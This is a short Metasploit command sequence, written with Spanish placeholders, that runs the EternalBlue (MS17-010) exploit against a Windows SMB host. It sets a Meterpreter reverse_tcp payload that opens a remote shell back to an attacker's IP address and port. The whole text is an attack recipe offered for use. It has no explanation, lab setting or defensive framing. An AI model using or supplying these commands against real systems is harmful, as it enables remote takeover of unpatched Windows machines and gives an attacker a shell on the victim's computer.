# (') method
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <dirección IP>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <dirección IP del atacante>
set LPORT <puerto local>
set ExitFunc ''
exploit

